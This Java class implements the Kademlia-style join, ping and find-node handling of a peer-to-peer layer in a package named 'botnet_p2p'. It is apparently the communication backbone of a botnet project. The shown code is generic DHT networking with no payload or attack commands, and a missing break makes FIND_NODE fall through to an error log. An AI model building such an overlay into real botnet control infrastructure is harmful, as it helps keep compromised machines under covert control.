package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.model.Peer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.TimeUnit;

import static botnet_p2p.MessageOuterClass.Message;


public class BusinessLogicLayer extends Thread {
    private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
    private static final int BOOTSTRAP_TIMEOUT = 8;

    private P2pLayer p2pLayer;
    private KademliaPeer me;
    private BlockingQueue<Message> decodedMessagesQueue;

    public BusinessLogicLayer(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;

        decodedMessagesQueue = p2pLayer.getDecodedMessagesQueue();
    }

    public void joinNetwork(Peer bootstrapNode) throws InterruptedException {
        List<KademliaPeer> pingedNodes = new ArrayList<>();
        p2pLayer.findNode(bootstrapNode, me);

        Message message = decodedMessagesQueue.take();
        logger.info("new message decoded found, type: " + message.getType());
        if (message.getType() == Message.MessageType.FOUND_NODES) {

            KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
            if (!sender.equalsTo(bootstrapNode)) {
                logger.error("found nodes msg does not come from bootstrapNode");
                return;
            }
            // bootstrapNode responded, adding it to routing table
            p2pLayer.getRoutingTable().insert(sender);

            message.getFoundNodes().getNodesList().forEach(contact -> {
                        // pinging nodes that we got from bootstrapNode
                        KademliaPeer peer = KademliaPeer.fromContact(contact);
                        logger.info("pinging node: " + peer.getGuid());
                        p2pLayer.ping(peer, me);
                        pingedNodes.add(peer);
                    }
            );

            long endTime = System.currentTimeMillis() + BOOTSTRAP_TIMEOUT * 1000;
            logger.info("waiting for ping responses");
            while (true) {
                message = decodedMessagesQueue.poll(1, TimeUnit.SECONDS);
                if (message != null && message.getType() == Message.MessageType.PING_RESPONSE) {
                    KademliaPeer kademliaPeer = KademliaPeer.fromContact(message.getSender());
                    // peer responded, so it's alive - we can add it to routing table
                    p2pLayer.getRoutingTable().insert(kademliaPeer);
                    pingedNodes.remove(kademliaPeer);
                }

                // stop when all nodes responded or timeout
                if (pingedNodes.isEmpty() || System.currentTimeMillis() > endTime) {
                    pingedNodes.clear();
                    logger.info("bootstrap process finished");
                    break;
                }
            }

            // TODO optional step - ping nodes to fill more buckets in the routing table
            // p2pLayer.findNode(kademliaPeer, me, randomGUID);
        }
    }

    @Override
    public void run() {
        while (true) {
            try {
                logger.info("starting main loop");
                Message messsage = decodedMessagesQueue.take();
                logger.info("message received by business logic layer");
                logger.info("processing this message");

                if (messsage.getSender() == null) {
                    logger.trace("sender not defined in message, skipping");
                    continue;
                }

                // add sender to routing table
                KademliaPeer sender = KademliaPeer.fromContact(messsage.getSender());
                this.p2pLayer.getRoutingTable().insert(
                        sender
                );

                switch (messsage.getType()) {
                    case PING:
                        // respond
                        p2pLayer.pingResponse(sender, me);
                        break;
                    case FIND_NODE:
                        // respond with nearest nodes list
                        List<KademliaPeer> nearestPeers = this.p2pLayer.getRoutingTable().getNearestPeers(
                                messsage.getFindNode().getGuid()
                        );
                        p2pLayer.foundNodes(sender, me, nearestPeers);
                    default:
                        logger.error("unsupported message type");
                }

            } catch (InterruptedException e) {
                // TODO
                e.printStackTrace();
            }
        }
    }

}
